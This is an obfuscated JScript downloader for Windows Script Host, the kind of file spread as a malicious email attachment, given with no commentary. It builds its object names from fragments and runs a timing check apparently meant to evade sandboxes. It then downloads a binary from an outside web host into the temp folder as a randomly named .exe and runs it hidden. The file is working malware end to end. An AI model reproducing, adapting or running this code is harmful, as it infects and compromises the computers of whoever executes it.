var G0 = false;
var MG = "Create"+"Object";
var UU = function A() {return WScript[MG]("WScript"+".Shell");}(), AE = 11;
var SC = "MSXML2"+".XMLHTTP";
var P = 2;
var X0 = P - 2;
function V(F){UU["Run"](F, X0, X0);};
function X(){return SC + "";};
function B(NI, J0){X0 = X0 * 1; return NI - J0;};
function J(){return MG;};
/*@cc_on
  @if (@_win32 || @_win64)
    G0 = true;
  @end
@*/
if (G0)
{
var G = "";
function BJ(){return 22;};
var RA = 0; var F0 = 0;
function TE()
{
var M = new this["Date"]();
var FF = M["getUTCMilliseconds"]();
WScript["Sleep"](BJ());
var M = new this["Date"]();
var KE = M["getUTCMilliseconds"]();
WScript["Sleep"](BJ());
var M = new this["Date"]();
var GV = M["getUTCMilliseconds"]();
var RA = "PR";
RA = B(KE, FF);
var F0 = "X1";
F0 = B(GV, KE);
G = "open";
return B(RA, F0);
}
var B0 = false;
var CB = false;
for (var T0 = X0; T0 < BJ() * 1; T0++){if (TE() != X0){
B0 = true; 
F0 = "31" + 11 * RA + F0; 
CB = true; 
break;
}}
function U() {return ((B0 == true) && (B0 == CB)) ? 1 : X0;};
if (B0 && U() && CB){
function T() {return UU["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "c2Tk5j2a5SvPcD.ex" + "e";};
 WY = X();
 AF = WScript[MG](WY);
 var A0 = 1;
do { 
	for (;A0;){
	try {
		if (A0 == 1)
		{
			AF[G]("GET", "http://a-ntsuhan.com/k38sav", false);
			AF["send"]();
			W = "Sleep";
			A0 = 2;
		}
		WScript[W](BJ() + 120); 
		if (AF["readystate"] < 2 * 2) continue;
		A0 = X0;
		function Y(CR) {var Q = (1, 2, 3, 4, 5, CR); return Q;};
		T1 = WScript[J()]("ADODB.Stream");
		WY = T1;
		WY[G]();
		WY["type"] = Y(1);
		WY["write"](AF["ResponseBody"]);
		T1["position"] = Y(X0);
		WY["Save" + "ToFile"](T(), 2);
		T1["cl"+"ose"]();
		Y0 = T();
		V(Y0);
	} catch(O){};};
}while (A0);
}
}

